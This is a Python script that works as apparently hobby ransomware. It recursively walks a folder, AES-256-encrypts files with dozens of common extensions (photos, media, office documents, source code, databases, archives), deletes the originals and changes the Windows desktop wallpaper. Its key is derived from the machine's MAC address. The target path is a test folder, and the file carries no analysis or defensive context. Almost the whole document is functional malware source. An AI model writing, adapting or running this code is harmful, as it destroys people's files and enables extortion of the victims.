from Cryptodome.Cipher import AES
import os.path
import struct
import hashlib
import ctypes
from uuid import getnode as get_mac

IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
SALT_SIZE = 16  # This size is arbitrary

extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        'java', 'class', 'jar', # java source code
        'ps', 'bat', 'vb', # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
    ]

def enc_file(base, in_filename, out_filename, chunksize=64*1024):
    iv = base[0:IV_SIZE]
    key = base[IV_SIZE:]

    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def search_enc(path):
    try:
        files = os.listdir(path)
        for file in files:
            filename = os.path.join(path, file)

            if(os.path.isdir(filename)):
                search_enc(filename)

            else:
                ext = filename.split('.')[-1]
                if ext in extensions:
                    outfilename = filename + '.enc'
                    enc_file(base, filename, outfilename, chunksize=64 * 1024)
                    os.remove(filename)
    except PermissionError:
        pass

def change_bg():
    imagePath = os.getcwd() + '/윾즉2.jpg'
    print(imagePath)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, imagePath, 3)

testPath = 'C:/Users/tmdgh/Desktop/test123/'

mac = get_mac()

salt2 = mac
salt2 = (salt2 * 5 * 2 + 7) % 1000000
salt2 = str(salt2)
salt2 = salt2.encode()

password2 = str(mac)
password = password2.encode()

base = hashlib.pbkdf2_hmac('sha256', password, salt2, 100000, dklen=IV_SIZE + KEY_SIZE)
iv = base[0:IV_SIZE]
key = base[IV_SIZE:]

change_bg()

search_enc(testPath)
